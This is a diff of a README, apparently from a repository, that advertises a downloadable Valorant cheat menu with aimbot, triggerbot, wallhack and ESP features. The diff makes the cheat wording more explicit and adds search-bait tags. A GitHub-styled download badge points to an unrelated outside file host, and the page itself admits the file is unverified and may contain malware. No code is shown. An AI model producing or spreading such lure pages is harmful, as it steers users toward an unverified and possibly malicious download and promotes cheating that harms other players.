@@ -5,48 +5,49 @@
 [![Download](https://img.shields.io/badge/Download-Hack_Menu_Valorant-brightgreen?style=for-the-badge&logo=github)](https://huangqing.net/s/file)
 
 <p align="center">
-  <img src="https://p2.bahamut.com.tw/B/2KU/90/a7f572fe6eba2e30ec4a8adb0a1x2vi5.JPG" alt="Valorant Gameplay Screenshot" width="100%">
+  <img src="https://gamemodifier.com/app/uploads/products/media/media_699cc829ac666.png" alt="Valorant ESP Cheat Menu Example" width="100%">
 </p>
 
-**Hack Menu for Valorant** is an unofficial third-party gaming utility concept associated with Riot Games' competitive tactical shooter, featuring advertised aim configurations, visual settings, gameplay adjustments, and interface customization.
+**Hack Menu for Valorant** is an unofficial third-party gaming utility concept associated with Riot Games' competitive tactical shooter, featuring advertised aiming assistance, ESP overlays, targeting configurations, and customizable menu options.
 
-Third-party cheat menus may claim to provide additional targeting tools, enemy information displays, and customizable gameplay controls. The linked software's functionality has not been independently verified.
+Third-party Valorant cheat menus often advertise additional gameplay controls, enemy information displays, targeting adjustments, and personalized configurations. The linked download's actual capabilities remain unverified.
 
 ## ✨ Features & Options
 
 Third-party hack menus may advertise features such as:
 
-- 🎯 **Aimbot Settings** — Advertised aiming assistance and target selection controls.
-- 👁️ **ESP Options** — Claimed enemy visibility and information overlays.
-- 🔫 **Weapon Settings** — Weapon-related customization categories.
-- ⚡ **Aim Smoothing** — Advertised targeting speed and movement adjustments.
-- 🎯 **FOV Controls** — Configurable targeting field-of-view settings.
-- 🖥️ **Visual Customization** — Adjustable overlay and display preferences.
-- 🎮 **Gameplay Settings** — Additional game-related configuration options.
-- ⚙️ **Custom Hotkeys** — Personalized keyboard shortcuts.
-- 🎨 **Menu Interface** — Customizable interface appearance.
-- 💾 **Config Management** — Configuration profiles and saved preferences.
+- 🎯 **Aimbot Settings** — Advertised automated targeting and aiming configuration.
+- 👁️ **Player ESP** — Claimed enemy visibility and player information overlays.
+- 🔫 **Triggerbot** — Advertised automatic firing options.
+- ⚡ **Aim Smoothing** — Adjustable targeting speed and movement preferences.
+- 🎯 **FOV Controls** — Customizable targeting field-of-view settings.
+- 🦴 **Skeleton ESP** — Advertised player model visualization.
+- ❤️ **Health ESP** — Claimed player health information displays.
+- 👀 **Wallhack Options** — Advertised enemy visibility through obstacles.
+- 🎨 **Customizable UI** — Personalized interface colors and layout.
+- ⚙️ **Hotkey Settings** — Adjustable keyboard shortcuts.
+- 💾 **Config Management** — Saved settings and user profiles.
 
-*These are commonly advertised categories, not verified capabilities of the linked download.*
+*These are advertised feature categories, not confirmed capabilities of the linked software.*
 
 ## 🔥 Highlights
 
-- 🎯 Valorant-related targeting configuration categories
-- 👁️ Advertised visual overlay settings
-- 🎨 Customizable interface concepts
-- ⚙️ Organized configuration menus
+- 🎯 Valorant-related aiming configuration categories
+- 👁️ ESP and visual overlay concepts
+- ⚡ Customizable targeting preferences
 - 🔫 Weapon-related settings categories
-- 🚀 Quick-access controls
-- 💾 Personalized configuration profiles
+- 🎨 Adjustable cheat menu interface
+- 🛠️ Organized configuration options
+- 💾 Personalized settings profiles
 
 ## ⚠️ Disclaimer
 
 This is an unofficial third-party utility concept and is not affiliated with Riot Games or Valorant.
 
-The linked file's functionality, authenticity, and security have not been independently verified. Unknown downloads may contain malware, while unauthorized gameplay modifications may violate Riot Games' rules and result in account restrictions or permanent bans.
+The linked file's functionality, authenticity, and security have not been independently verified. Unknown downloads may contain malware, and unauthorized gameplay modifications can violate game rules and result in account restrictions or permanent bans.
 
-The image above depicts Valorant gameplay, not a verified screenshot of the linked software.
+The screenshot illustrates a third-party Valorant cheat interface and does not represent a verified preview of the linked download.
 
 ---
 
-⭐ **Valorant Hack Menu | Valorant Cheat Tools | Valorant ESP | Aim Settings | Gaming Utility | Download**
+⭐ **Valorant Hack Menu | Valorant Cheat Tools | Valorant Aimbot | Valorant ESP | Wallhack | Download**
